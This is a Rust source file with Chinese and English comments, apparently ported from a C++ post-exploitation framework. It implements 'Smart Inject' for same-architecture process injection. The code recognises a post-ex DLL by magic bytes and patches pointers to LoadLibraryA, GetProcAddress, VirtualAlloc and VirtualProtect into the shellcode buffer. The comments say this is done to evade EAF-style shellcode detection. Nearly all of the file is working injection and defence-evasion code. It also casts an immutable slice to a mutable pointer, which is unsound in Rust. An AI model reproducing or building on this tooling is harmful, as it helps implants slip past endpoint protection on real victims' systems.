//! 移植自 src/inject_smart.cpp —— Smart Inject 在同架构进程注入时向 DLL
//! 传播指针，以规避 EAF 以及使用类似 EAF 的技术来检测 shellcode 落地的
//! 实时防护措施。
//! Port of src/inject_smart.cpp — Smart Inject propagates pointers to a DLL
//! when doing same-arch process injection, to avoid EAF and real-time
//! prevention measures that use EAF-like techniques to detect shellcode
//! settling into a process.

use crate::inject::InjectContext;
use std::ffi::c_void;
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{VirtualAlloc, VirtualProtect};

/// 我们的 smart inject 指针。
/// our smart inject pointers
#[repr(C)]
#[derive(Clone, Copy)]
struct SmartInject {
    p_load_library_a: *mut c_void,
    p_get_proc_address: *mut c_void,
    p_virtual_alloc: *mut c_void,
    p_virtual_protect: *mut c_void,
    check: u32,
}

/// 快速查看我们是否是一个支持 SmartInject 的 DLL
/// （SMARTINJECTCHECK：WORD magic、char padding[1018]、DWORD header）。
/// A quick view to check if we're a SmartInject-enabled DLL
/// (SMARTINJECTCHECK: WORD magic, char padding[1018], DWORD header).
const SMARTINJECT_HEADER_OFFSET: usize = 2 + 1018; // 1020

/// 判断 smart inject 是否开启（isSmartInject）。
/// Determine if smart inject is on (or not) (isSmartInject).
pub fn is_smart_inject(buffer: &[u8], length: usize) -> bool {
    // 我们最小的 post-ex DLL 也 >=50KB。
    /* our smallest post-ex DLL is still >=50KB */
    if length < 51200 {
        return false;
    }
    if buffer.len() < 1024 {
        return false;
    }

    // 把缓冲区转换为我们的头部，并寻找 smart inject 协议。
    /* cast our buffer to our header and look for the smart inject protocol */
    let magic = u16::from_le_bytes([buffer[0], buffer[1]]);
    let header = u32::from_le_bytes([
        buffer[SMARTINJECT_HEADER_OFFSET],
        buffer[SMARTINJECT_HEADER_OFFSET + 1],
        buffer[SMARTINJECT_HEADER_OFFSET + 2],
        buffer[SMARTINJECT_HEADER_OFFSET + 3],
    ]);

    magic == 0x5A4D && header == 0xF4F4F4F4
}

/// 对缓冲区值做多少（如果有的话）修改（SetupSmartInject）。指针被写入
/// 缓冲区中头部末尾的位置；C++ 接受 `char * buffer` 并原地写入，因此我们
/// 通过（保证可写的）shellcode 缓冲区做同样的事。
/// How much (if any) to alter the buffer value (SetupSmartInject). The
/// pointers are written into the buffer right at the end of the headers;
/// the C++ takes `char * buffer` and writes in place, so we do the same
/// through the (guaranteed writable) shellcode buffer.
pub fn setup_smart_inject(context: &mut InjectContext, buffer: &[u8], length: usize) {
    // 如果不是 smart inject，什么都不做。
    /* if we're not smart inject, do nothing */
    if !is_smart_inject(buffer, length) {
        return;
    }

    // 检查我们是否同架构！
    /* check that we're the same arch! */
    if !context.same_arch {
        return;
    }

    // 我们正好位于头部的末尾。
    /* we're located right at the end of the headers */
    let offset = 1024usize.saturating_sub(std::mem::size_of::<SmartInject>());
    let ptrs = unsafe { buffer.as_ptr().add(offset) as *mut SmartInject };

    // 设置我们的 smart inject 值。
    /* setup our smart inject values */
    unsafe {
        (*ptrs).check = 0xF00D;
        (*ptrs).p_get_proc_address = GetProcAddress as *const () as *mut c_void;
        (*ptrs).p_load_library_a = LoadLibraryA as *const () as *mut c_void;
        (*ptrs).p_virtual_alloc = VirtualAlloc as *const () as *mut c_void;
        (*ptrs).p_virtual_protect = VirtualProtect as *const () as *mut c_void;
    }
}
